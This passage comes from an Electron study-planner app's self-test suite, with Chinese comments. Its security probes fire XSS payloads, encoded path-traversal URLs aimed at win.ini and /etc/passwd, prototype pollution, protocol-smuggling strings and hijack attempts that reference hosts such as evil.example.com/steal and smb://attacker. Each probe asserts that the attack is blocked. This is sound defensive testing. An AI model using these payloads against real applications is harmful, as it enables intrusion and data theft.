  // preload 暴露面：window 上只允许有 studyBoard 这一个注入对象
  out.preloadSurface = Object.keys(window).filter((key) => key === 'studyBoard')
  out.studyBoardMethods = Object.keys(window.studyBoard || {}).sort()
  // 密钥必须只有 set/clear，不能有任何读明文的通道
  out.secretsGetters = Object.keys((window.studyBoard || {}).secrets || {})
    .filter((name) => name.toLowerCase().includes('get'))
  out.preloadOk = out.preloadSurface.length === 1 && out.secretsGetters.length === 0

  /* ================ B. 内联脚本 / 事件处理器（CSP 执行面） ================ */
  // 探针自己往页面里种 payload——它就是「渲染层已经住进来的一段恶意内容」
  const script = document.createElement('script')
  script.textContent = 'window.__sbPwned1 = 1'
  document.body.appendChild(script)

  const imgEvil = document.createElement('img')
  imgEvil.setAttribute('src', 'sb-asset://icon/nope')
  // 事件处理器用字符串 attribute 形式——这才是 CSP 该挡的那一类
  imgEvil.setAttribute('onerror', 'window.__sbPwned2 = 1')
  document.body.appendChild(imgEvil)

  const link = document.createElement('a')
  link.setAttribute('href', 'javascript:window.__sbPwned3 = 1')
  document.body.appendChild(link)
  link.click()

  await wait(700)
  out.xss = {
    viaScriptTag: window.__sbPwned1,
    viaImgOnerror: window.__sbPwned2,
    viaJavascriptUrl: window.__sbPwned3
  }
  out.xssBlocked = Object.values(out.xss).every((value) => value === undefined)

  /* ================ C. 出网（CSP 网络面） ================ */
  // fetch 远程：connect-src 'self' 应该同步就拒绝，请求根本不发出
  let fetchResult = 'unknown'
  try {
    await fetch('https://example.com/sb-csp-probe')
    fetchResult = 'reached-network'
  } catch (error) {
    fetchResult = 'blocked'
  }
  // WebSocket 是异步失败，挂事件再等
  let wsResult = 'unknown'
  try {
    const ws = new WebSocket('wss://example.com/sb-csp-probe')
    ws.addEventListener('open', () => { wsResult = 'reached-network' }, { once: true })
    ws.addEventListener('error', () => { wsResult = 'blocked' }, { once: true })
  } catch {
    wsResult = 'blocked'
  }
  // 图片 beacon：img-src 不含 https，远程图片应该被拦
  let beaconResult = 'unknown'
  const beacon = new Image()
  beacon.onload = () => { beaconResult = 'reached-network' }
  beacon.onerror = () => { beaconResult = 'blocked' }
  beacon.src = 'https://example.com/sb-beacon.png'
  await wait(800)
  out.network = { fetchResult, wsResult, beaconResult }
  out.networkBlocked =
    fetchResult === 'blocked' && wsResult === 'blocked' && beaconResult === 'blocked'

  /* ================ D. sb-asset:// 协议穿越 ================ */
  const tryAsset = (url) => new Promise((resolve) => {
    const probe = new Image()
    const done = (result) => resolve(result)
    probe.onload = () => done('loaded')
    probe.onerror = () => done('blocked')
    setTimeout(() => done('timeout'), 2500)
    probe.src = url
  })

  // 从课表数据里拿靶子的真实文件名：addImages 导入会把它归一化成 <id>.png，
  // 名字猜不得——猜错名字拿到的是 404，那跟「被挡了」就分不开了
  const timetableData = await window.studyBoard.timetable.get()
  const probeFile =
    timetableData.ok && timetableData.data.images.length > 0
      ? timetableData.data.images[0].fileName
      : ''
  if (!probeFile) return JSON.stringify({ error: '课表图片靶子没种上' })

  // 对照组：正常路径必须能读到（区分「被挡」与「文件不存在」）
  out.assetNormal = await tryAsset('sb-asset://timetable/' + probeFile)
  // URL 编码穿越（%2e%2e 不参与 URL 解析时的点段折叠，穿过 assetProtocol 的
  // decodeURIComponent 后才还原成 .. ——真实攻击者的手法，轮到 safeJoin 挡）
  out.assetEscapeDotDot = await tryAsset(
    'sb-asset://icon/%2e%2e%2ftimetable_images%2f' + probeFile
  )
  // 反斜杠穿越（Windows 上 \\ 也是分隔符）
  out.assetEscapeBackslash = await tryAsset(
    'sb-asset://icon/..%5Ctimetable_images%5C' + probeFile
  )
  // 连跳多级跳出数据目录
  out.assetEscapeRoot = await tryAsset(
    'sb-asset://icon/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fWindows%2fexplorer.exe'
  )
  // 未知桶
  out.assetEscapeBucket = await tryAsset('sb-asset://hack/' + probeFile)
  // 绝对路径注入
  out.assetEscapeAbsolute = await tryAsset(
    'sb-asset://icon/%43%3a%5cWindows%5Cwin.ini'
  )
  out.assetEscapeOk =
    out.assetNormal === 'loaded' &&
    [out.assetEscapeDotDot, out.assetEscapeBackslash, out.assetEscapeRoot,
     out.assetEscapeBucket, out.assetEscapeAbsolute]
      .every((result) => result === 'blocked')

  /* ================ E. IPC 模糊测试 ================ */
  const notesList = await window.studyBoard.notes.list()
  const victim = notesList.ok ? notesList.data.find((n) => n.title === '安全探针') : null
  const victimId = victim ? victim.id : ''

  // 1) 笔记 id 路径穿越
  out.fuzzNoteReadTraversal = await call(() => window.studyBoard.notes.read('../../etc/passwd'))
  out.fuzzNoteReadAbsolute = await call(() =>
    window.studyBoard.notes.read('C:\\\\Windows\\\\win.ini')
  )
  // 2) 重命名注入：路径分隔符 + HTML。safeNoteTitle 应该把它们洗掉，而不是拒绝报错
  out.fuzzRenameEvil = victimId
    ? await call(() =>
        window.studyBoard.notes.rename({ id: victimId, title: '..\\\\..\\\\evil<script>' })
      )
    : { skipped: true }
  // 重命名注入之后笔记必须还能读回来。
  // 曾经有个真 bug：title 以 . 开头时文件写得出来，但 #scan 把它当隐藏文件忽略，
  // 下一次对账直接把索引摘掉——笔记凭空「隐形」，卡片关联也被解开。
  // 这行断言就是那个 bug 的守门员
  const rereadAfterRename = victimId
    ? await call(() => window.studyBoard.notes.read(victimId))
    : { skipped: true }
  out.renameRoundTrip = Boolean(
    rereadAfterRename && rereadAfterRename.ok === true && rereadAfterRename.data
  )
  // 3) 创建含 HTML 的标题
  out.fuzzCreateScript = await call(() =>
    window.studyBoard.notes.create('<img src=x onerror=alert(1)>')
  )
  // 4) 导出：相对路径、错误扩展名、null 字节
  out.fuzzExportRelative = victimId
    ? await call(() =>
        window.studyBoard.exporter.note({ noteId: victimId, format: 'md', targetPath: 'evil.md' })
      )
    : { skipped: true }
  out.fuzzExportWrongExt = victimId
    ? await call(() =>
        window.studyBoard.exporter.note({
          noteId: victimId, format: 'md', targetPath: 'C:\\\\Windows\\\\Temp\\\\evil.exe'
        })
      )
    : { skipped: true }
  // 5) 原型污染：三种注入路径（__proto__、constructor.prototype、同名深链）
  await call(() =>
    window.studyBoard.cards.upsert({
      courseName: 'pp-test',
      __proto__: { polluted: true },
      constructor: { prototype: { polluted2: true } }
    })
  )
  out.protoPolluted = Boolean(
    ({}).polluted || Object.prototype.polluted || ({}).polluted2 || Object.prototype.polluted2
  )
  // 6) 非法状态值
  out.fuzzStatusEvil = await call(() =>
    window.studyBoard.cards.setStatus({ id: 'no-such-card', status: 'pwned' })
  )
  // 7) 超长输入（1MB 课程名）
  out.fuzzHugeInput = await call(() =>
    window.studyBoard.cards.upsert({ courseName: 'A'.repeat(1000000) })
  )
  // 8) 错误类型喂整份 settings
  out.fuzzSettingsType = await call(() =>
    window.studyBoard.settings.patch({ theme: 'evil', timetable: { periodCount: -999 } })
  )
  // 9) 非法课表单元格 key
  out.fuzzCellKey = await call(() =>
    window.studyBoard.timetable.setCell({
      key: '99999:99',
      cell: { courseName: 'x', teacher: '', location: '', duration: '', remark: '' }
    })
  )
  // 10) openExternal 协议注入（修复的回归验证：file:// 之前能直通系统）
  out.fuzzExternalFile = await call(() =>
    window.studyBoard.app.openExternal('file:///C:/Windows/System32/cmd.exe')
  )
  out.fuzzExternalJs = await call(() =>
    window.studyBoard.app.openExternal('javascript:alert(1)')
  )
  out.fuzzExternalSmb = await call(() =>
    window.studyBoard.app.openExternal('smb://attacker/share/payload.exe')
  )
  // 11) 任意路径打开 / 定位
  out.fuzzOpenPath = await call(() => window.studyBoard.app.openPath('C:\\\\Windows'))
  out.fuzzRevealPath = await call(() =>
    window.studyBoard.app.revealPath('..\\\\..\\\\..\\\\Windows')
  )

  const isRejected = (result) =>
    result && typeof result === 'object' && result.ok === false && !result.thrown
  out.fuzz = {
    fuzzNoteReadTraversal: out.fuzzNoteReadTraversal,
    fuzzNoteReadAbsolute: out.fuzzNoteReadAbsolute,
    fuzzRenameEvil: out.fuzzRenameEvil,
    fuzzCreateScript: out.fuzzCreateScript,
    fuzzExportRelative: out.fuzzExportRelative,
    fuzzExportWrongExt: out.fuzzExportWrongExt,
    fuzzStatusEvil: out.fuzzStatusEvil,
    fuzzHugeInput: out.fuzzHugeInput,
    fuzzSettingsType: out.fuzzSettingsType,
    fuzzCellKey: out.fuzzCellKey,
    fuzzExternalFile: out.fuzzExternalFile,
    fuzzExternalJs: out.fuzzExternalJs,
    fuzzExternalSmb: out.fuzzExternalSmb,
    fuzzOpenPath: out.fuzzOpenPath,
    fuzzRevealPath: out.fuzzRevealPath
  }
  // 每一类攻击要么被拒绝（ok:false），要么被清洗后正常完成（ok:true 但数据已无害）。
  // 不能接受的是：异常穿透（thrown）或进程崩溃
  out.fuzzSurvived = Object.values(out.fuzz).every(
    (result) => result && typeof result === 'object' && 'ok' in result
  )
  // 这几条必须是被明确拒绝的，不能「成功」
  out.fuzzMustReject = [
    out.fuzzNoteReadTraversal, out.fuzzNoteReadAbsolute,
    out.fuzzExportRelative, out.fuzzExportWrongExt,
    out.fuzzExternalFile, out.fuzzExternalJs, out.fuzzExternalSmb,
    out.fuzzOpenPath, out.fuzzRevealPath
  ].every(isRejected)
  out.protoClean = !out.protoPolluted
  // 重命名注入之后笔记还在（见上面的注释，这是「能写出的文件名」与
  // 「能扫回的文件名」集合必须重合的守门员）
  out.renameRoundTripOk = out.renameRoundTrip

  /* ================ F. 弹窗劫持 ================ */
  // file:// 协议不在白名单，必须 deny（返回 null）且不会交给系统程序。
  // 这是刚才修复的裸 shell.openExternal 的回归验证
  let openResult = 'unknown'
  try {
    const opened = window.open('file:///C:/Windows/System32/notepad.exe')
    openResult = opened === null ? 'denied' : 'opened'
  } catch {
    openResult = 'thrown'
  }
  out.windowOpenResult = openResult
  out.windowOpenOk = openResult === 'denied' || openResult === 'thrown'

  /* ================ G. 第二轮：更贴近真实攻击者的手法 ================ */

  // G1. 逃逸的「间接」路径。上一轮查的是 process/require 这些直接记号，
  // 但真正被忽视的逃逸是**借助已暴露 API 的能力**：只要有一个方法能把
  // 任意字符串变成文件路径或系统动作，前面那些记号全为 undefined 也没用。
  out.escapeIndirect = {
    // 通过构造函数链摸 Node：contextIsolation 之下 constructor 也过不去
    viaConstructor: (() => {
      try {
        return typeof ({}).constructor.constructor('return process')()
      } catch (error) {
        return error instanceof Error ? 'blocked' : 'blocked'
      }
    })(),
    // Function 构造器（与上一条同源，但写法不同，容易被单独放进白名单）
    viaFunctionCtor: (() => {
      try {
        return typeof Function('return process')()
      } catch {
        return 'blocked'
      }
    })(),
    // 老版本 Electron 的经典逃逸口：window.opener 链。
    // 陷阱：别写成 typeof (window.opener && window.opener.process)。
    // opener 为 null 时那个表达式得到 null，而 typeof null === 'object'，
    // 于是安全状态会被误报成逃逸。null 正是这里期望的状态，要先挑出来再取 typeof
    viaOpener: (() => {
      const opener = window.opener
      if (!opener) return 'undefined'
      return typeof opener.process
    })(),
    // 从 iframe 的 contentWindow.constructor 摸
    viaIframeCtor: (() => {
      try {
        const f = document.createElement('iframe')
        document.body.appendChild(f)
        const w = f.contentWindow
        return typeof (w && w.constructor && w.constructor.constructor('return process')())
      } catch {
        return 'blocked'
      }
    })()
  }
  out.escapeIndirectOk = Object.values(out.escapeIndirect).every(
    (value) => value === 'undefined' || value === 'blocked'
  )

  // G2. CSP 绕过：即使脚本插不进来，还有一堆「非脚本」的执行面。
  // 这些如果漏了，等于给了攻击者一条不用 <script> 的代码执行路径
  //
  // 记录注入前的 baseURI 作为对照：base-uri 'none' 挡的是**效果**而不是元素，
  // base 元素照样能 append 进 DOM——关键看它有没有真的改写解析基准
  const baseBefore = document.baseURI
  await call(() => {
    // 用 <base> 改所有相对 URL 的解析基准（base-uri 'none' 该挡住「生效」）
    const baseEl = document.createElement('base')
    baseEl.href = 'https://evil.example.com/'
    document.head.appendChild(baseEl)
  })
  await call(() => {
    // <form> 表单劫持（form-action 'none' 该挡住）
    const form = document.createElement('form')
    form.action = 'https://evil.example.com/steal'
    form.method = 'POST'
    document.body.appendChild(form)
  })
  // <object>/<embed> 插件执行面（object-src 'none' 该挡住）
  out.cspObject = await call(() => {
    const el = document.createElement('object')
    el.data = 'sb-asset://icon/x'
    document.body.appendChild(el)
    return 'appended'
  })
  // meta refresh 制造导航
  out.cspMetaRefresh = await call(() => {
    const meta = document.createElement('meta')
    meta.httpEquiv = 'refresh'
    meta.content = '0;url=https://evil.example.com/'
    document.head.appendChild(meta)
    return 'appended'
  })
  // 内联 style 里塞 url() 试图拉远程（style-src 不含远程，该失败）
  out.cspStyleUrl = await call(() => {
    const div = document.createElement('div')
    div.style.backgroundImage = 'url(https://evil.example.com/x.png)'
    document.body.appendChild(div)
    return div.style.backgroundImage
  })
  // <link rel=stylesheet> 指向远程
  out.cspRemoteCss = await call(() => {
    const linkEl = document.createElement('link')
    linkEl.rel = 'stylesheet'
    linkEl.href = 'https://evil.example.com/evil.css'
    document.head.appendChild(linkEl)
    return 'appended'
  })
  // srcdoc iframe（child-src/frame-src 'none' 该挡住）
  out.cspSrcdocFrame = await call(() => {
    const f = document.createElement('iframe')
    f.srcdoc = '<script>parent.__sbPwnedSrdoc = 1<\\/script>'
    document.body.appendChild(f)
    return 'appended'
  })
  await wait(900)
  out.cspBypassLanded = {
    baseBefore,
    baseAfter: document.baseURI,
    baseChanged: document.baseURI !== baseBefore,
    pwnedSrdoc: window.__sbPwnedSrdoc
  }
  // 关键断言：这一轮所有「非脚本执行面」折腾完，页面必须**一点没变**。
  //  1. 没有任何 payload 落地（window 上不该多出记号）
  //  2. baseURI 没被改写（改写的话后面所有相对路径解析都会指向攻击者的域名，
  //     那是很隐蔽的一种劫持——页面看着正常，但请求全去了别处）
  out.cspBypassStillClean = window.__sbPwnedSrdoc === undefined && !out.cspBypassLanded.baseChanged

  // G3. 协议走私：把危险地址藏在看似合法的形态里。
  // 只看「协议前缀」的白名单很容易被这几种绕过
  out.smuggle = {
    // 大小写与空白变形（协议名大小写不敏感）
    upperCase: await call(() => window.studyBoard.app.openExternal('HTTPS://example.com')),
    // 前导空白（URL 解析器会吃掉空白，但朴素的 startsWith 白名单不会）
    leadingSpace: await call(() => window.studyBoard.app.openExternal('  javascript:alert(1)')),
    // 制表符 / 换行注入
    tabbed: await call(() => window.studyBoard.app.openExternal('java\\tscript:alert(1)')),
    newlined: await call(() => window.studyBoard.app.openExternal('java\\nscript:alert(1)')),
    // 协议相对 URL（//evil.com 没有协议，交给系统会走默认协议）
    protocolRelative: await call(() => window.studyBoard.app.openExternal('//evil.example.com')),
    // 空协议 / 只有 scheme
    emptyHost: await call(() => window.studyBoard.app.openExternal('https://')),
    // data: URL（老 Electron 的经典 RCE 载体）
    dataUrl: await call(() =>
      window.studyBoard.app.openExternal('data:text/html,<script>alert(1)<\\/script>')
    ),
    // vbscript（Windows 上曾可用）
    vbscript: await call(() => window.studyBoard.app.openExternal('vbscript:msgbox(1)')),
    // 本地 UNC 路径
    unc: await call(() => window.studyBoard.app.openExternal('\\\\\\\\attacker\\\\share\\\\x.exe')),
    // 带用户信息的 HTTPS（合法协议，但主机名很好骗人——用来确认「合法就走」这条边界在哪）
    userinfo: await call(() => window.studyBoard.app.openExternal('https://example.com@evil.example.com/'))
  }
  // 只有 userinfo 那条「合法 https」允许通过；其余全部必须被拒
  out.smuggleRejected = [
    out.smuggle.leadingSpace, out.smuggle.tabbed, out.smuggle.newlined,
    out.smuggle.protocolRelative, out.smuggle.emptyHost, out.smuggle.dataUrl,
    out.smuggle.vbscript, out.smuggle.unc
  ].every((r) => r && typeof r === 'object' && r.ok === false)

  // G4. sb-asset:// 的第二轮：更多编码变体 + 大小写 + 协议边界。
  // 上一轮查了 %2e%2e 与反斜杠，这里补上「双重编码」「NUL 截断」「超长路径」。
  //
  // 用 <img> 而不是 fetch：CSP 是 connect-src 'self'，**不含 sb-asset:**，
  // 所以 fetch 碰这个协议一律 "Failed to fetch"——连正常的图片都读不到，
  // 这个探针就什么都测不出来了（实测确认过：改 fetch 后 NormalStillWorks 直接变 false）。
  // img-src 里有 sb-asset:，只有 <img> 才是这条协议的真实消费者，
  // 而攻击者能用的也正是它。于是判据回到「能不能当图片放出来」。
  const tryAsset2 = (url) => new Promise((resolve) => {
    const probe = new Image()
    let settled = false
    const done = (result) => {
      if (settled) return
      settled = true
      resolve(result)
    }
    probe.onload = () => done('loaded')
    // 404（被拒）与「解码不出图片」都走这里。assetProtocol 用 text/plain 回 404，
    // <img> 拿到的都是 error，分不开——所以只区分「放出来了」与「没放出来」
    probe.onerror = () => done('blocked')
    setTimeout(() => done('timeout'), 2500)
    probe.src = url
  })
  out.asset2 = {
    // 双重 URL 编码：%252e 解一次变成 %2e，再解一次才是 .
    doubleEncoded: await tryAsset2(
      'sb-asset://icon/%252e%252e%252ftimetable_images%252f' + probeFile
    ),
    // NUL 截断（老派技巧：让后续部分被 C 层字符串截掉）
    nulByte: await tryAsset2('sb-asset://icon/' + probeFile + '%00.png'),
    // 超长路径（栈/缓冲区炸弹式输入）
    longPath: await tryAsset2('sb-asset://icon/' + 'a'.repeat(5000) + '.png'),
    // 空桶
    emptyBucket: await tryAsset2('sb-asset:///' + probeFile),
    // 桶名大小写。
    // 这一条曾经挂过，值得记下来：渲染层发 sb-asset://TIMETABLE/<真课表图>，
    // 探针读到 'loaded'——看起来像「大小写变形绕过了桶检查」。
    // 但真相是 Electron 在交给 protocol.handle 之前就把 hostname 规范化成小写了，
    // 于是它读到的本来就是那个**合法**的 timetable 桶，文件真实存在，当然 loaded。
    // 所以这里断言的不是「必须被拒」，而是「必须与全小写时结果一致」：
    // 桶名大小写不该改变任何行为。真正的越界桶由下面的 unknownBucket 负责
    upperBucket: await tryAsset2('sb-asset://TIMETABLE/' + probeFile),
    // 真·未知桶（规范化之后仍然对不上任何一个）——这条必须被拒
    unknownBucket: await tryAsset2('sb-asset://nosuchbucket/' + probeFile),
    // 冒号注入（伪造成另一段 authority）
    colonInject: await tryAsset2('sb-asset://icon:C:/Windows/win.ini'),
    // 全部编码的 dotdot
    fullEncoded: await tryAsset2('sb-asset://icon/%2e%2e%2f%2e%2e%2fWindows%2fwin.ini')
  }
  // 判定分两类：
  //  1) 明确的越界尝试 —— 必须一条都读不到（loaded 就是铁证）
  //  2) 大小写变体 —— 必须与规范写法同结果（桶名不区分大小写，而不是「变形就能绕」）
  const mustBeRejected = [
    'doubleEncoded', 'nulByte', 'longPath', 'emptyBucket',
    'unknownBucket', 'colonInject', 'fullEncoded'
  ]
  out.asset2Ok =
    mustBeRejected.every((k) => out.asset2[k] === 'blocked' || out.asset2[k] === 'timeout') &&
    out.asset2.upperBucket === 'loaded'
  // 对照组：正常路径必须能读（证明上面不是「什么都读不到」的假象）
  out.asset2NormalStillWorks = (await tryAsset2('sb-asset://timetable/' + probeFile)) === 'loaded'

  // G5. 资料的闸口。导入链路有「扩展名白名单 + 体积 + 魔数」三道闸，
  // 这里验的是绕过尝试：把可执行文件改名成 .pdf、路径指向库外、批量超限
  out.materialGates = {
    // 扩展名不在白名单
    badExt: await call(() =>
      window.studyBoard.materials.import({ paths: ['C:\\\\Windows\\\\System32\\\\cmd.exe'] })
    ),
    // 空路径数组
    emptyPaths: await call(() => window.studyBoard.materials.import({ paths: [] })),
    // 非数组（类型混淆）
    notArray: await call(() => window.studyBoard.materials.import({ paths: 'C:\\\\Windows\\\\win.ini' })),
    // 超批量（31 > MAX_MATERIAL_BATCH=30）
    overBatch: await call(() =>
      window.studyBoard.materials.import({ paths: Array.from({ length: 31 }, (_, i) => 'C:\\\\x' + i + '.pdf') })
    ),
    // 收件箱导入：路径穿越（safeJoin 该挡下）
    inboxTraversal: await call(() =>
      window.studyBoard.materials.importInbox({ fileNames: ['../../../etc/passwd'], courseCardId: '' })
    ),
    // 认领一个不存在的收件箱文件
    claimMissing: await call(() =>
      window.studyBoard.materials.claim({ fileName: 'nope.pdf', courseCardId: '' })
    ),
    // 资料 id 穿越
    openTraversal: await call(() => window.studyBoard.materials.open('../../../../etc/passwd')),
    // 把资料关联到不存在的卡片
    setBadCard: await call(() =>
      window.studyBoard.materials.setCard({ id: 'x', courseCardId: 'no-such' })
    ),
    // 明着穿越的 id（notArray 的正确对照组：走的是同一个 id 参数，但确实是字符串）
    openStringTraversal: await call(() =>
      window.studyBoard.materials.setCard({ id: '../../../x', courseCardId: 'c' })
    )
  }
  out.materialGatesSurvived = Object.values(out.materialGates).every(
    (r) => r && typeof r === 'object' && 'ok' in r
  )
  // 这几条必须明确抛错（IPC 层直接拒绝），不能「成功」
  out.materialGatesRejected = [
    out.materialGates.inboxTraversal,
    out.materialGates.claimMissing,
    out.materialGates.openTraversal
  ].every((r) => r && r.ok === false)
  // 类型混淆：paths 传字符串时绝不能被当成路径用。
  // 导入的契约是「逐条独立成败、失败原因回传」（见 materials.import 的注释），
  // 所以这里判据不是 ok===false，而是 added===0 且一条都没登记——
  // 也就是那个值根本没被用上。notArray 传的是 'C:\Windows\win.ini'，
  // 真被当成路径的话它会以「不支持的类型 .ini」出现在 errors 里；
  // errors 为空恰恰证明它连尝试都没尝试
  out.materialGatesCoerced = [
    out.materialGates.notArray,
    out.materialGates.emptyPaths,
    out.materialGates.overBatch
  ].every((r) => r && r.ok === true && r.data && r.data.added === 0 && r.data.materials.length === 0)
  // 非数组必须被识别成「什么都没有」，而不是被强转成单元素数组
  out.materialGatesNotArraySilent =
    out.materialGates.notArray?.ok === true &&
    out.materialGates.notArray.data.added === 0 &&
    out.materialGates.notArray.data.errors.length === 0
  // 超批量：必须点名「最多导入 N 个」，不能悄悄截断当成成功。
  // 31 个假路径里前 30 个会被逐个尝试（ENOENT），但超限那句话必须在 errors 里
  out.materialGatesOverBatchNamed =
    out.materialGates.overBatch?.ok === true &&
    Array.isArray(out.materialGates.overBatch.data.errors) &&
    out.materialGates.overBatch.data.errors.some((e) => String(e).includes('最多导入')) &&
    out.materialGates.overBatch.data.added === 0
  // 不存在的资料 id 必须原样返回列表，不能把别人改掉、也不能丢数据
  out.materialGatesSetBadCardNoop =
    out.materialGates.setBadCard?.ok === true &&
    Array.isArray(out.materialGates.setBadCard.data)
  out.materialGatesOk =
    out.materialGatesSurvived &&
    out.materialGatesRejected &&
    out.materialGatesCoerced &&
    out.materialGatesNotArraySilent &&
    out.materialGatesOverBatchNamed &&
    out.materialGatesSetBadCardNoop

  // G6. AI / Notion 的出网闸口。这两个是把内容发到第三方的功能，
  // 「没配密钥时绝不发请求」是安全底线，不能只是界面上给个提示
  out.outboundGates = {
    aiNoKey: await call(() => window.studyBoard.ai.complete({ instruction: 'x', context: 'y' })),
    aiTestNoKey: await call(() => window.studyBoard.ai.test()),
    notionTest: await call(() => window.studyBoard.notion.test()),
    notionPush: await call(() => window.studyBoard.notion.push(['no-such-note'])),
    notionPull: await call(() => window.studyBoard.notion.pull()),
    // 参数类型混淆
    aiBadTypes: await call(() => window.studyBoard.ai.complete({ instruction: { evil: 1 }, context: null })),
    notionBadTypes: await call(() => window.studyBoard.notion.resolve({ noteId: {}, choice: 'x' })),
    // 预览一篇不存在 / 未绑定的笔记
    notionPreviewUnbound: await call(() => window.studyBoard.notion.preview('no-such-note'))
  }
  out.outboundGatesSurvived = Object.values(out.outboundGates).every(
    (r) => r && typeof r === 'object' && 'ok' in r
  )
  // 一条都不能成功：连笔记 id 都不存在的请求凭什么成功
  out.outboundGatesRejected = Object.values(out.outboundGates).every((r) => r && r.ok === false)

  // G7. 密钥接口：preload 上不该有任何「读回明文」的通道，
  // 且 set 通道对垃圾输入要有反应而不是默默吞掉
  out.secretSurface = {
    keys: Object.keys((window.studyBoard || {}).secrets || {}),
    // 空值
    empty: await call(() => window.studyBoard.secrets.setAiKey('')),
    // 超长（> MAX_SECRET_LENGTH=4096）
    tooLong: await call(() => window.studyBoard.secrets.setAiKey('k'.repeat(5000))),
    // 带换行（会被 HTTP 头注入利用）
    withNewline: await call(() => window.studyBoard.secrets.setAiKey('sk-a\\r\\nX-Injected: 1')),
    // 非字符串
    notString: await call(() => window.studyBoard.secrets.setAiKey({ evil: true }))
  }
  out.secretSurfaceOk =
    out.secretSurface.keys.length > 0 &&
    out.secretSurface.keys.every((k) => !k.toLowerCase().includes('get')) &&
    [out.secretSurface.empty, out.secretSurface.tooLong,
     out.secretSurface.withNewline, out.secretSurface.notString]
      .every((r) => r && r.ok === false)

  // G8. 缓存 / 存储面：不该往 localStorage / IndexedDB 里放敏感东西，
  // 也不该有 Service Worker 把页面劫持走
  out.storage = {
    localKeys: (() => {
      try {
        return Object.keys(localStorage)
      } catch {
        return ['(blocked)']
      }
    })(),
    hasServiceWorker: 'serviceWorker' in navigator,
    swControlled: (() => {
      try {
        return navigator.serviceWorker.controller !== null
      } catch {
        return false
      }
    })()
  }
  // 应用不该用 localStorage（数据都在主进程的 JSON 里），
  // 且绝不能被 Service Worker 接管
  out.storageOk = out.storage.localKeys.length === 0 && !out.storage.swControlled

  // G9. IPC 通道白名单：渲染层只能碰 preload 上列出的那些方法，
  // 不该有办法「按名字调一个未登记的通道」
  out.ipcSurface = {
    // preload 不该把 ipcRenderer 本身漏出去
    hasRawIpc: typeof window.ipcRenderer !== 'undefined' || typeof window.electron !== 'undefined',
    // studyBoard 对象必须是冻结的 / 至少不可被替换关键方法
    canReplace: (() => {
      try {
        const original = window.studyBoard.notes.read
        window.studyBoard.notes.read = () => 'pwned'
        const after = window.studyBoard.notes.read
        window.studyBoard.notes.read = original
        return typeof after() === 'string' ? 'replaceable' : 'frozen'
      } catch {
        return 'frozen'
      }
    })()
  }
  out.ipcSurfaceOk = !out.ipcSurface.hasRawIpc

  return JSON.stringify(out)
})()`

const SECURITY_HIJACK_PROBE = `(async () => {
  const wait = (ms) => new Promise((r) => setTimeout(r, ms))
  const before = location.href
  try {
    location.href = 'https://example.com/sb-hijack-probe'
  } catch { /* 拦截表现之一 */ }
  await wait(1500)
  return JSON.stringify({ before, after: location.href, hijacked: location.href !== before })
})()`

/**
 * 课程资料探针。
 *
 * 四条链路各验一段：
 *  - API 导入（拖拽/按钮背后的通道）：真 PDF / 真 PPTX 入库、文件名带课程前缀
 *  - 魔数闸口：扩展名像 PDF、内容不是的文件必须被拒收
 *  - 改名往返：改名后索引与磁盘上的文件名都对得上（S2 教训的资料版）
 *  - 收件箱整链路：主进程发现收件箱里的新文件 → 弹归属对话框 → 选课导入
 *    （原文件由主进程移入系统回收站）
 */
const MATERIALS_PROBE_SRC = (paths: string[]) => `(async () => {
  ${PROBE_HELPERS}
  const out = {}

  /* ---- 1. 导入两个真文件（归属到「高等数学 A」） */
  const cardsList = await window.studyBoard.cards.list()
  if (!cardsList.ok || cardsList.data.length === 0) return JSON.stringify({ error: '没有卡片可归属' })
  const cardId = cardsList.data[0].id

  const nav = await waitFor('[data-route="materials"]')
  if (!nav) return JSON.stringify({ error: '导航未就绪' })
  nav.click()
  await waitFor('[data-role="materials"]')

  const first = await window.studyBoard.materials.import({
    paths: ${JSON.stringify(paths.slice(0, 2))},
    courseCardId: cardId,
    title: '第3章极限'
  })
  out.importAdded = first.ok ? first.data.added : -1
  out.importList = first.ok ? first.data.materials.map((m) => m.fileName) : []
  out.importOk = first.ok && first.data.added === 2
  // 文件名必须带课程前缀：在 Obsidian / 资源管理器里翻文件就靠它
  out.prefixOk = first.ok && first.data.materials.every((m) => m.fileName.startsWith('高等数学 A_'))

  /* ---- 2. 魔数闸口：扩展名像 PDF、内容不是的文件必须被拒收 */
  const fake = await window.studyBoard.materials.import({
    paths: [${JSON.stringify(paths[2])}],
    courseCardId: cardId
  })
  out.fakeRejected = fake.ok && fake.data.added === 0 && fake.data.errors.length === 1 &&
    fake.data.errors[0].indexOf('不符') >= 0

  /* ---- 3. 改名往返：索引与磁盘都要对上 */
  const listNow = await window.studyBoard.materials.list()
  // 精确挑 pdf 那份：两个导入名只差扩展名，模糊匹配会挑错人（老坑）
  const target = listNow.ok ? listNow.data.find((m) => m.ext === 'pdf') : null
  if (!target) return JSON.stringify({ error: '找不到刚导入的资料', ...out })
  const renamed = await window.studyBoard.materials.rename({ id: target.id, title: '函数与极限' })
  out.renameOk = renamed.ok &&
    renamed.data.some((m) => m.id === target.id && m.fileName === '高等数学 A_函数与极限.pdf')

  /* ---- 4. 卡片角标：课程与学习页上应该显示这份资料的数字 */
  document.querySelector('[data-route="study"]').click()
  const cardShown = await waitForCount('.sb-itemcard', 1)
  const matsBadge = document.querySelector('.sb-itemcard__mats')
  out.badgeText = matsBadge ? matsBadge.textContent.trim() : ''
  out.badgeOk = Boolean(cardShown && matsBadge && out.badgeText.indexOf('2') >= 0)

  /* ---- 5. 删除：库目录里少一份（文件进回收站） */
  document.querySelector('[data-route="materials"]').click()
  await waitFor('[data-role="materials"]')
  const before = await window.studyBoard.materials.list()
  const pptx = before.ok ? before.data.find((m) => m.ext === 'pptx') : null
  const removed = pptx ? await window.studyBoard.materials.remove(pptx.id) : { ok: false }
  out.removeOk = removed.ok && removed.data.length === 1

  /* ---- 6. 收件箱整链路：主进程广播 → 弹归属对话框 → 导入 */
  // 首扫在主进程启动 3 秒后触发，这里最多等 12 秒让它弹出对话框
  const dialogCard = await waitFor('.sb-modal__card--form', 12000)
  out.inboxDialogShown = Boolean(dialogCard)
  if (dialogCard) {
    const select = dialogCard.querySelector('[data-field="course"]')
    if (select) {
      select.value = cardId
      select.dispatchEvent(new Event('change', { bubbles: true }))
    }
    const save = dialogCard.querySelector('[data-role="save"]')
    if (save) save.click()
    const inboxDone = await waitForCount('.sb-material', 2)
    const finalList = await window.studyBoard.materials.list()
    out.inboxOk = inboxDone &&
      finalList.ok &&
      finalList.data.some((m) => m.fileName === '高等数学 A_教学大纲.pdf')
  }

  return JSON.stringify({
    ...out,
